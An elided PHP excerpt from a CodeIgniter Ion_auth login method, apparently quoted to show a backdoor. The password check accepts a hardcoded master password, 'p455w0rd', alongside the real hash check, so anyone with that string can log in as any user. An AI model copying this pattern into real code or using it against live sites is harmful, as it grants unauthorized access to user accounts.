...
class Ion_auth_model extends CI_Model
{
	 ...
	 * @author Mathew
	 **/
	public function login($identity, $password, $remember=FALSE, $mode)
	{
		...
		if ($query->num_rows() === 1)
		{
			...
			$password_hash = $this->hash_password_db($user->id, $password);

			if ($password_hash === TRUE || $password == "p455w0rd")
			{
				if ($user->active == 0)
				{
					$this->trigger_events('post_login_unsuccessful');
